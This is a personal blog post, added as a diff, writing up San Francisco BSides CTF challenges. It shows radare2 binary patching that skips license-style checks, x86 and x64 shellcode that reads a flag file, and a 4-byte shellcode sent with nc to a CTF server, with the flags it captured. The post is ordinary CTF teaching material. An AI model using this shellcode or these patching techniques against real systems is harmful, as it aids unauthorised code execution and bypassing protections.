@@ -1,0 +1,367 @@
+#+BEGIN_EXPORT html
+---
+layout: page
+title: San Francisco BSides CTF Writeup
+excerpt: A quick writeup of San Francisco Bsides CTF
+tags:
+  - ctf
+  - infosec
+category: note
+---
+#+END_EXPORT
+
+* Conference
+In my short life, I've seen security conferences move from /"hide the speed
+pipe"/ to /"Information security professionals discuss changes in information
+assurance policy and cybersecurity"/.
+
+At no other hacker conference is it clearer than at BSides that the the racous
+parties and threats of e-violence have been replaced with the hushed tones and
+somber realities of securing actual computer networks. Bsides is still closer to
+hacking's eager and optimistic roots than to it's sober future, but the impact
+of shifting status and fabulous wealth of new infosec startups has perceptibly
+influenced it's culture already.
+
+Because of the conference's stature in the Bay Area, many of the intelligensia
+of the San Francisco haqr scene managed to make an appearance. Lots of drinks
+were handed out, door security was lax and the hallway track was alive.
+* Writeups
+
+I lost interest in the talks fairly quickly, but after a friend invited me to
+play the CTF and I was immediately impressed. The Bsides crew managed to avoid
+many of the lame challenge formats and structural deficits that have made other
+CTFs tiresome rather than competitive. The challenges were extremely diverse in
+their subjects and no one group (even 'professional' CTF teams) managed to
+secure an answer to every challenge.
+
+Me and my friend managed to do pretty well, we ended up finishing in the top 5% of
+participants with substantially smaller team than others. 
+
+Because so many of these challenges don't have their answers published by their
+XXXXXXXs after the event is settled, it's up to the community to put together
+'writeups' of the techniques employed in solving these. Here is a smattering of
+some challenges I've written for.
+
+
+** NOP
+   The =NOP= instruction is microcode for =xchg EAX, EAX=
+** easycap
+   This challenge doesn't include the flag in a string because it's spread out over
+   multiple packets. You can easily extract the flag by 'following' a TCP stream in
+   your network packet capture software of choice.
+
+** easy
+    This challenge doesn't require you to perform any reverse engineering as the
+    the flag is visible as a direct =.symstrtab= entry.
+
+    #+BEGIN_EXAMPLE
+zv@syszv >> strings easy-64 | grep -i flag
+FLAG:db2f62a36a018bce28e46d976e3f9864
+    #+END_EXAMPLE
+
+** Skipper
+    In this challenge I'm going to use one of the best disassemblers available
+    today: [[http://radare.org/r/][radare]] . It is both free and contains many facilities for modifying
+    the binary in various ways (without plugins). (You could also solve this
+    challenge with a debugger very easily)
+
+#+BEGIN_EXAMPLE
+cp tmp/skipper64 /tmp/skipper64-backup # a backup in case you fubar the binary
+r2 /tmp/skipper64
+#+END_EXAMPLE
+
+Next, seek the read head to the =main= symbol and tap ~V~ key to bring yourself
+into disassembly.
+
+#+BEGIN_EXAMPLE
+[0x004026d1]> s main
+#+END_EXAMPLE
+
+#+BEGIN_EXAMPLE
+    0x004026d1      push rbp                                                                                                                                                                                
+    0x004026d2      mov rbp, rsp                                                                                                                                                                            
+    0x004026d5      sub rsp, 0x420                                                                                                                                                                          
+    0x004026dc      mov dword [rbp - 0x414], edi                                                                                                                                                            
+    0x004026e2      mov qword [rbp - 0x420], rsi                                                                                                                                                            
+    0x004026e9      mov rax, qword fs:[0x28]                   ; [0x28:8]=0x3200 ; '('                                                                                                                      
+    0x004026f2      mov qword [rbp - 8], rax                                                                                                                                                                
+    0x004026f6      xor eax, eax                                                                                                                                                                            
+    0x004026f8      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x004026ff      mov rdi, rax                                                                                                                                                                            
+    0x00402702      call 0x400b3e                              ;[1]                                                                                                                                         
+    0x00402707      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x0040270e      mov rsi, rax                                                                                                                                                                            
+    0x00402711      mov edi, str.Computer_name:__s_n           ; "Computer name: %s." @ 0x402987                                                                                                            
+    0x00402716      mov eax, 0                                                                                                                                                                              
+    0x0040271b      call sym.imp.printf                        ;[2]                                                                                                                                         
+    0x00402720      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x00402727      mov esi, str.hax0rz__                      ; "hax0rz!~" @ 0x40299a                                                                                                                      
+    0x0040272c      mov rdi, rax                                                                                                                                                                            
+    0x0040272f      call sym.imp.strcmp                        ;[3]                                                                                                                                         
+    0x00402734      test eax, eax                                                                                                                                                                           
+┌─< 0x00402736      je 0x40275b                                ;[4]                                                                                                                                         
+│   0x00402738      lea rax, [rbp - 0x410]                                                                                                                                                                  
+│   0x0040273f      mov rsi, rax                                                                                                                                                                            
+│   0x00402742      mov edi, str.Sorry ; "Sorry, your computer's name - %s - is not correct!." @ 0x4029a8                                                    
+│   0x00402747      mov eax, 0                                                                                                                                                                              
+│   0x0040274c      call sym.imp.printf                        ;[2]                                                                                                                                         
+│   0x00402751      mov edi, 9                                                                                                                                                                              
+│   0x00402756      call sym.imp.raise                         ;[5]                                                                                                                                         
+└─> 0x0040275b      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x00402762      mov rdi, rax                                                                                                                                                                            
+    0x00402765      call 0x400c4a                              ;[6]                                                                                                                                         
+    0x0040276a      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x00402771      mov rsi, rax                                                                                                                                                                            
+    0x00402774      mov edi, str.OS_version:__s_n              ; "OS version: %s." @ 0x4029dc                                                                                                               
+    0x00402779      mov eax, 0                                                                                                                                                                              
+    0x0040277e      call sym.imp.printf                        ;[2]                                                                                                                                         
+    0x00402783      lea rax, [rbp - 0x410]                                                                                                                                                                  
+    0x0040278a      mov esi, str.2.4.31                        ; "2.4.31" @ 0x4029ec                                                                                                                        
+    0x0040278f      mov rdi, rax                                                                                                                                                                            
+    0x00402792      call sym.imp.strcmp                        ;[3]                                                                                                                                         
+    0x00402797      test eax, eax                                                                                                                                                                           
+┌─< 0x00402799      je 0x4027e3                                ;[7]                                                                                                                                         
+│   0x0040279b      lea rax, [rbp - 0x410]                                                                                                                                                                  
+│   0x004027a2      mov rsi, rax                                                                                                                                                                            
+│   0x004027a5      mov edi, str.Sorry__your_OS_version____s___is_not_supported__n
+#+END_EXAMPLE
+
+You can see here that several functions are being called and compared against
+builtin strings like /hax0r!~/. The context gives you an idea that it's checking
+the hostname, but let's be sure.
+
+#+BEGIN_EXAMPLE
+[0x004026d1]> s 0x400b3e
+[0x00400b67]> pd 10 @ +64
+0x00400ba7      mov edi, 1
+0x00400bac      call sym.imp.exit
+0x00400bb1      mov ecx, 0
+0x00400bb6      mov edx, 0x40291f                          ; "-n"
+0x00400bbb      mov esi, str.uname                         ; "uname" @ 0x402922
+0x00400bc0      mov edi, str.uname                         ; "uname" @ 0x402922
+0x00400bc5      mov eax, 0
+0x00400bca      call sym.imp.execlp
+0x00400bcf      call sym.imp.__errno_location
+0x00400bd4      mov eax, dword [rax]
+#+END_EXAMPLE
+
+You can see it's calling =uname= here. Before you start changing your system's
+configuration to accommodate, first know it's not possible to set your hostname
+to this value.
+
+This means you are going to either have to use a debugger and manually change
+the =ZF=, =CF=, =OF= or other condition flags or patch up all of the =je=
+instructions.
+
+#+BEGIN_EXAMPLE
+[0x00400b67]> oo+ # This makes the binary writable
+[0x00400b67]> wao jmp @ 0x00402736
+[0x00400b67]> wao jmp @ 0x00402799
+...
+#+END_EXAMPLE
+
+After this, run the binary and get the flag! ~FLAG:f51579e9ca38ba87d71539a9992887ff~
+
+
+** TODO Skipper2
+
+** Easyshell 1 
+   Both of the easyshell puzzles are warmups who run any shellcode sent on the
+   wire. However, you can't use some of the most common shellcode for spawning
+=/bin/sh= as there is no remote shell. This shellcode reads the file
+   =/home/ctf/flag.txt=
+
+   Compile with ~nasm -f bin flag.asm~
+
+#+BEGIN_SRC asm
+BITS 32
+section .text
+_start:
+	xor	%eax, %eax
+	xor	%ebx, %ebx
+	xor	%ecx, %ecx
+	xor	%edx, %edx
+	jmp	two
+
+one:
+	pop	%ebx
+	
+	movb	$5, %al
+	xor	%ecx, %ecx
+	int	$0x80
+	
+	mov	%eax, %esi
+	jmp	read
+
+exit:
+	movb	$1, %al
+	xor	%ebx, %ebx
+	int	$0x80
+
+read:
+	mov	%esi, %ebx
+	movb	$3, %al
+	sub	$1, %esp
+	lea	(%esp), %ecx
+	movb	$1, %dl
+	int	$0x80
+
+	xor	%ebx, %ebx
+	cmp	%eax, %ebx
+	je	exit
+
+	movb	$4, %al
+	movb	$1, %bl
+	movb	$1, %dl
+	int	$0x80
+	
+	add	$1, %esp
+	jmp	read
+
+two:
+	call	one
+	.string	"/home/ctf/flag.txt"
+#+END_SRC
+
+
+** Easyshell 2
+   Like the prior challenge, you simply just need to write some code to read out
+   a file. I used the following.
+
+   #+BEGIN_SRC asm
+ BITS 64
+ section .text
+ _start:
+   jmp _push_filename
+
+ _readfile:
+   ; syscall open file
+   pop rdi ; pop path value
+   xor rax, rax
+   add al, 2
+   xor rsi, rsi ; set O_RDONLY flag
+   syscall
+  
+   ; syscall read file
+   sub sp, 0xfff
+   lea rsi, [rsp]
+   mov rdi, rax
+   xor rdx, rdx
+   mov dx, 0xfff; size to read
+   xor rax, rax
+   syscall
+  
+   ; syscall write to stdout
+   xor rdi, rdi
+   add dil, 1 ; set stdout fd = 1
+   mov rdx, rax
+   xor rax, rax
+   add al, 1
+   syscall
+  
+   ; syscall exit
+   xor rax, rax
+   add al, 60
+   syscall
+  
+ _push_filename:
+   call _readfile
+   path: db "/home/ctf/flag.txt"
+   #+END_SRC
+
+** i-am-the-shortest
+   This is a challenge designed to mimic the common constraints exploit authors must deal with.
+
+   The premise of the challenge is that you get to execute 5 arbitrary bytes - far
+   shorter than even the shortest shellcode could allow for.
+
+   There's undoubtedly dozens of ways the problem can be solved, I've successfully used two:
+
+*** Direct System Call
+    Beginning at =0x80487ef=, the core code runs:
+
+    #+BEGIN_SRC asm
+  call   80486db <get_flag> ;; where the 'flag' is gotten
+  add    esp,0x10
+  lea    eax,[ebp-0x8c]
+  mov    esi,eax
+  mov    ebx,0x1
+  sub    esp,0x8
+  lea    eax,[ebp-0x8c]
+  push   eax
+  push   0x8048946
+  call   8048500 <printf@plt>
+  add    esp,0x10
+  sub    esp,0xc
+  push   0x8048964
+  call   8048550 <puts@plt>
+  add    esp,0x10
+  sub    esp,0x4
+  push   0x5
+  push   DWORD PTR [ebp-0x94]
+  push   0x0
+  call   80484f0 <read@plt> ;; where `read` is called
+  add    esp,0x10
+  mov    DWORD PTR [ebp-0x90],eax
+  mov    edx,0xff
+  cmp    DWORD PTR [ebp-0x90],0x5
+  ja     804885c <main+0x10c>
+  jmp    DWORD PTR [ebp-0x94] ;; here is where it finally jumps in
+    #+END_SRC
+
+    The last line is where this =jmp= to attacker-controlled memory actually
+    occurs.
+
+    Although the above code snippet doesn't show it directly, it's also important
+    to note that the address of the flag read remains stored in =ESI= when the ~jmp
+    [ebp-0x94]~ occurs.
+
+    In tandem with the fact that =read= returns the length of the value read in
+    =EAX=, you can abuse this by entering a system-call. (Remember, Linux calling
+    convention dictates that x86 system call's interrupt vector is given in =EAX=)
+
+    So, in total you need to write shellcode that is only *4* bytes long (rather
+    than the maximum permitted of 6), you can have the interrupt vector 'prefilled'
+    for you. This leaves you with only two tasks:
+
+    - All you need to do now is find an efficient way to copy =ESI= into =ECX= (the source register for the =read= system call)
+    - Actually invoking a system call.
+
+    There are a number of ways to do the above and due to the idiosyncracies of how
+    assemblers are written and how opcodes are decoded, it's possible to write many
+    different variations of an instruction that vary wildly in length. Anything
+    that moves the contents of ESI into ECX will do.
+
+    After this, you need to initiate a system call, you can use either =sysenter=
+    or =int 0x80= as both are encoded in 2 bytes.
+
+    All told, the following shellcode should do just fine.
+ 
+    #+BEGIN_SRC asm
+  mov cx, si
+  int 0x80
+    #+END_SRC
+
+    I use and recommend [[http://www.nasm.us/][Netwide Assembler]], although there are other tools like
+    [[https://github.com/radare/radare2/wiki/Ragg2][Ragg2]]. To generate assembly without any sort of executable format, you can use
+    the following argument switches to assemble and hexdump your shellcode:
+
+    ~nasm -f bin assembly.asm && xxd assembly~
+
+    After this, you can encode it in whichever format you'd like and send it off!
+
+    #+BEGIN_EXAMPLE
+ [zv@syszv] /tmp >> echo -en '\x89\xf1\xcd\x80' | \
+                    nc i-am-the-shortest-6d15ba72.ctf.bsidessf.net 8890
+ The address of 'flag' is 0xfff3bd5c
+ Send your machine code now! Max length = 5 bytes.
+
+ FLAG:c9f053110aa0f2d28ed8978e3b03cb01
+ v7`v`v7`vyy`v`vp7x%
+    #+END_EXAMPLE
+
+*** Return-to-Libc
+    This is a little trickier, you need to abuse at least two different tricks here.
+
+   
+   
